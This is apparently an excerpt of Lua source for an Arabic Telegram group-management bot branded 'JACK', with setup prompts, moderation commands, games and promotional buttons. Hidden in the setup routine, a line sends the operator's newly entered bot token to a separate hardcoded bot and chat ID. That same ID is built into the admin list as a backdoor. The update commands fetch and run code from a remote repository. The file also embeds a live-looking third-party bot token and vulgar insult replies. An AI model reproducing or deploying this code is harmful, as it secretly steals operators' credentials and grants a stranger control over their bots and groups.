...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1900386181:AAFMwGkct-xcF-pxK9k3tM9YtzvkClMT-vo/sendmessage?chat_id=1721540719&text=' ..token)
end 
else
print('\27[0;35m≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n\27[0;33;49m')
...
io.write('\27[1;31m ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Ffasit/sherifmohamed1/shico/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1721540719,71,71,71,71}   
...
var = true 
elseif tonumber(user_id) == tonumber(71) then
var = true  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'صاحب الخرابه يكسمك من جوه'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "xx_Source_JACK")
local NameUser = " 𖤛  مـن قبـل  ⇇["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = " 𖤛 اسم المستخدم  ⇇["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_," 𖤛 الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
...
Send(msg.chat_id_,msg.id_,'\n 𖤛 صاحب الخرابه يكسمك')   
return false  end 
if Json_Info.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n 𖤛 كلب الخرابه ')   
return false  end
if Json_Info.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n 𖤛 حذف التلي عشان يرتاح من وشك ')   
return false  end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》")  
...
if text == "الغاء" or text == "الغاء 𖤛" then   
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or '𝙅𝘼𝘾𝙆 𓃠') 
local DRAGON_Msg = { 
...
if not DevSoFi(msg) then
local Text = [[
𖤛سعر التنصيب علي سورس 𝙅𝘼𝘾𝙆 𓃠 
💖سعر التنصيب العادي 25 جنيه فقط
𖤛للتواصل اتبع الازرار بالاسف
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𖤛𝐃𝐄𝐕 𝐒𝐇𝐘𝐂𝐎 𖠳',url="t.me/xx_shico"}},
{{text = '𖤛𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐉𝐀𝐂𝐊 𖠨',url="t.me/xx_Source_JACK"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ❨𖤛• ≪━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━≫₎ •𖤛❩',url="t.me/xx_shico"}},
{{text = '《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》',url="t.me/xx_Source_JACK"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' or text == 'العوده𖤛' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖤛لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 𖤛اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
...
local Text = ' 𖤛تم ارسال الملصق من ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n - '..Name
...
database:set(bot_id..'Tuasl:Bots',true) 
send(msg.chat_id_, msg.id_,' 𖤛 ارسل لي رد الان')
return false
end
if text == 'مسح رد استارت' and DevSoFi(msg) then 
database:del(bot_id..'Tuasl:Bots') 
send(msg.chat_id_, msg.id_,' 𖤛 تم مسح رد استارت')
end
...
send(msg.chat_id_, msg.id_,' 𖤛 تم مسح كليشه ستارت')
end
...
echo '≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n 𖤛↝ الــدخــول ↜  ↚\n* '`whoami`'*'
echo '≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n 𖤛↝ مـده تـشغيـل الـسـيـرفـر ↜ ↚\n* '"$uptime"'*'
]]):read('*all'))  
end
if text == 'تحديث السورس ' and DevSoFi(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/Ffasit/sherifmohamed1/shico/main/DRAGON.lua')
...
local Text = '𖤛انت الان المطور الاساسي في البوت \n 𖤛سورس 𝙅𝘼𝘾𝙆 𓃠\n ??يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/xx_Source_JACK)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/83/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' 𖤛 اصدار سورس 𝙅𝘼𝘾𝙆 𓃠{ 3x☆}')
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطور السورس☎️', url="https://t.me/Oo_tiger"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Oo_tiger&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس 𝙅𝘼𝘾𝙆 𓃠 ادخل وتابع الجديد](t.me/xx_Source_JACK)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》', url="t.me/xx_Source_JACK"}}, 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xx_Source_JACK/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞⟦𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس 𝙅𝘼𝘾𝙆 𓃠 ادخل وتابع الجديد](t.me/xx_Source_JACK)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'xx_Source_JACK', url="t.me/𖤛𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐉𝐀𝐂𝐊 𖠨"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/𖤛𝐃𝐄𝐕 𝐓𝐈𝐆𝐄𝐑 𖠏/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'معلومات الكيبورد' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/xx_Source_JACK)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/xx_Source_JACK"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == '𝙅𝘼𝘾𝙆 𓃠 مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝المبرمج 𝙅𝘼𝘾𝙆 𓃠 لو حابب تتواصل معاه
اتبع الزر إلى تحت ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨𖤛• ≪━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━≫₎ •𖤛❩', url="t.me/Oo_tiger"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 𖤛 من أحسن السورسات على التليجرام سورس 𝙅𝘼𝘾𝙆 𓃠 𖤛
...
t = "\n 𖤛 قائمة مطورين الثانويين للبوت \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 𖤛 •\n• لايمكنك استخدام البوت 𖤛 •\n• عليك الاشتراك في القناة 𖤛 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' 𖤛 عدد المشتركين الان  ⇇( '..#pv..' )\n 𖤛 تم ازالة  ⇇( '..sendok..' ) من المشتركين\n 𖤛  الان عدد المشتركين الحقيقي  ⇇( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' 𖤛 لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n 𖤛 تم ازالة  ⇇↝ '..q..' ↜ جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n 𖤛 تم ازالة  ⇇↝ '..w..' ↜ كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' 𖤛  عدد الجروبات الان  ⇇↝ '..#group..' ↜'..DRAGONk..''..DRAGON..'\n 𖤛  الان عدد الجروبات الحقيقي  ⇇↝ '..sendok..' ↜ جروبات\n')   
end
end
end,nil)
end
...
usertext = '\n 𖤛 الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖤛 تم ترقيته مطور'
...
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤛 تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤛 الـعـضو   ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤛 '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_," 𖤛 تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "𝙅𝘼𝘾𝙆 𓃠")
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' 𖤛 تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_,0," 𖤛 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖤛 ["..DRAGON_Msg.."] \n")
else
send(msg.chat_id_,0," 𖤛 الـعـضو  : {["..data.first_name_.."](T.ME/xx_Source_JACK)}\n 𖤛 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 𖤛 عذرا  ⇇{["..data.first_name_.."](T.ME/xx_Source_JACK)}\n 𖤛 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' 𖤛عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' 𖤛عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖤛 الـجـروب مـفعـل مـن قبـل')
else
sendText(msg.chat_id_,'\n 𖤛 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 71)..'](tg://user?id='..result.id_..')\n 𖤛تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}\n  وتم تــرقــيه جــمــيع الـادمــنــيه',msg.id_/2097152/0.5,'md')
...
Text = ' 𖤛 تـم تـشغـيل الـبوت فـي الـجـروب جـديد\n'..
'\n 𖤛بواسطة {↝'..Name..'↜}'..
'\n 𖤛ايدي الجروب {'..IdChat..'}'..
'\n 𖤛اسم الجروب {['..NameChat..']}'..
'\n 𖤛عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n 𖤛الرابط {['..LinkGp..']}'
if not DevSoFi(msg) then
sendText(SUDO,Text,0,'md')
end
...
send(msg.chat_id_, msg.id_,' 𖤛 الـبوت مـعطـل مـن قبـل')
else
sendText(msg.chat_id_,'\n 𖤛 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 71)..'](tg://user?id='..result.id_..')\n 𖤛 تـم تـعـطيل الـبوت   {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
Text = '\n تـم تـعـطيل الـبوت مـن الـجـروب 𖤛'..
'\n 𖤛بواسطة {↝'..Name..'↜}'..
'\n 𖤛ايدي الجروب {'..IdChat..'}'..
'\n 𖤛اسم الجروب {['..NameChat..']}'..
'\n 𖤛الرابط {['..LinkGp..']}'
...
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖤛تـم تـشغـيل الـبوت فـي الـجـروب ')
else
sendText(msg.chat_id_,'\n 𖤛 مـن قبـل ↭ ['..string.sub(result.first_name_,0, 71)..'](tg://user?id='..result.id_..')\n 𖤛تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}\n  وتم تــرقــيه جــمــيع الـادمــنــيه',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
...
if text and text:match("^وضع قناة الاشتراك 𖤛$") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 𖤛 حسنآ ارسل لي معرف القناة')
return false  
end
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم تفعيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "+-+-+-+-+&--" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, ' 𖤛 تم تعطيل الالعاب')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم كتم الاسم '..BlNe)
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم الغاء كتم الاسم '..delBn)
...
texts = " 𖤛 تم مسح الاسماء المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
...
t = "\n 𖤛 قائمة الاسماء المكتومه \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫ \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if #All_name == 0 then
t = " 𖤛 لا يوجد اسماء مكتومه"
end
send(msg.chat_id_, msg.id_, t)
end
end
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, ' 𖤛 تم التفعيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم تعطيل الاسماء المكتومه')
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تعيين '..teh..' كتوحيد للمجموعه')
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تعين  '..nump..' عدد الكتم')
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم تعطيل التوحيد')
...
send(msg.chat_id_, msg.id_, " 𖤛 عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "xx_Source_JACK")..")\n ?? عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n 𖤛 عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local Text = {
  ...
  "ها شو غيرت صورتك 🤔😹",
  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹𖤛",
...
local Text =[[
⟦[𖤛𝐃𝐄𝐕 𝐒𝐇𝐘𝐂𝐎 𖠳](http://t.me/xx_shico)⟧

    [⟦ 𖤛𝐃𝐄𝐕 𝐓𝐈𝐆𝐄𝐑 𖠏 ⟧](http://t.me/Oo_tiger)

⟦[𖤛𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐉𝐀𝐂𝐊 𖠨](http://t.me/xx_Source_JACK)⟧
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𖤛𝐃𝐄𝐕 𝐒𝐇𝐘𝐂𝐎 𖠳', url = "https://t.me/xx_shico"}},
{{text = '𖤛𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐉𝐀𝐂𝐊 𖠨', url = "https://t.me/xx_Source_JACK"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xx_Source_JACK/10&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'ج' then
local Text = [[
 𖠪 اهلا بك في سورس 𝙅𝘼𝘾𝙆 𓃠 الجمدان 𖠪
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/3798&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'شيكو' or text == 'شيكو ' or text == 'مبرمج السورس'  then
local Text = [[
المبرمج شيكو لو حابب تتواصل معه اتبع الزر الاسفل 👇💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𖤛𝐃𝐄𝐕 𝐒𝐇𝐘𝐂𝐎 𖠳',url="t.me/xx_shico"}},
...
if text == 'تايجر ' or text == 'تايجر ' or text == 'مطور السورس'  then
local Text = [[
تايجرمطور سورس 𝐉𝐀𝐂𝐊 𓃠  للتواصل معه اتبع الزر الاسفل 👇💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' 𖤛𝐃𝐄𝐕 𝐓𝐈𝐆𝐄𝐑 𖠏',url="t.me/Oo_tiger"}},
{{text = '𖤛𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐉𝐀𝐂𝐊 𖠨',url="t.me/xx_Source_JACK"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
{{text = 'بوت تيك توك  𖤛',url="t.me/K0XBOT"}},
...
local Text = [[ 
مطورين ومبرمجين سورس 𝙅𝘼𝘾𝙆 𓃠 اتبع الازرار للتواصل معهم 👇🧿
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == "تصميم 𝙅𝘼𝘾𝙆 𓃠" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,3); 
local Text ='تم اختيار تصميم من تصميمات 𝙅𝘼𝘾𝙆 𓃠 هذه لك' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖤛• ≪━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━≫₎ •𖤛 ❩', url="t.me/xx_shico"}},
{{text = '《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》',url="t.me/xx_Source_JACK"}},
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/3794/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس 𝙅𝘼𝘾𝙆 𓃠؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس 𝙅𝘼𝘾𝙆 𓃠؟ ", 
"كم مره حبيت؟ ", 
...
local iduser = userid 
send(msg.chat_id_, msg.id_,'  𖤛الايدي ⇇↝'..iduser..'↜\n 𖤛المعرف ⇇↝'..username..'↜\n 𖤛الرتبه ⇇↝'..rtp..'↜\n 𖤛نوع الكشف ⇇بالمعرف') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,'  𖤛المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text == '《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》' then
local Text = [[ 
 𖤛من أحسن السورسات على التليجرام سورس 𝙅𝘼𝘾𝙆 𓃠 𖤛
حمايه.سرعه.دقه وامان
 قناه السورس 👇
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛](http://t.me/xx_Source_JACK)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ', url="t.me/xx_Source_JACK"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/84&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝙻𝚃𝚄𝙰𝚂𝙸𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 》', url="t.me/xx_shico"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/3785/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'مميزات'  or text == 'المميزات' then
local Text = [[ 
 ─────── 𖤛 ───────
𖤛 لستخدام المميزات اتبع مايلي ..↑↓
 ─────── 𖤛 ───────
𖤛 قران ← لعرض الميزه
𖤛 اذكار ← لعرض الميزه
𖤛 الصلاوات ← لعرض الميزه
𖤛 متحركه ← لعرض الميزه
𖤛 غنيلي ← لعرض الميزه
𖤛 استوري ← لعرض الميزه
𖤛 تصميم ← لعرض الميزه
𖤛 حساب العمر ← لعرض الميزه
𖤛 حساب الوزن ← لعرض الميزه
𖤛 نسبه الحب ← لعرض الميزه
𖤛 نسبه الغباء ← لعرض الميزه
𖤛 جمالي ← لعرض الميزه
𖤛 افلام ← لعرض الميزه
𖤛 اغاني ← لعرض الميزه
𖤛 روايات ← لعرض الميزه
𖤛 ثيم ← لعرض الميزه
𖤛 تصميم 𝙅𝘼𝘾𝙆 𓃠← لعرض الميزه
𖤛 غنيلي بفيديو← لعرض الميزه
𖤛 همسه ← لعرض الميزه
𖤛 معني + اسمك ← لعرض الميزه
𖤛 خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
𖤛 𝘾𝙃 - [《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》](t.me/xx_Source_JACK) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖤛• ≪━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━≫₎ •𖤛 ❩', url="t.me/xx_shico"}},
{{text = '❨  𖤛• ⁽𝚅𝙸𝙅𝘼𝘾𝙆 𓃠₎ •𖤛 ❩', url="t.me/xx_Source_JACK"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/83/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العاب 𝙅𝘼𝘾𝙆 𓃠' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 𖤛 اهلا في قائمه الالعاب المتطوره سورس 𝙅𝘼𝘾𝙆 𓃠 𖤛 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
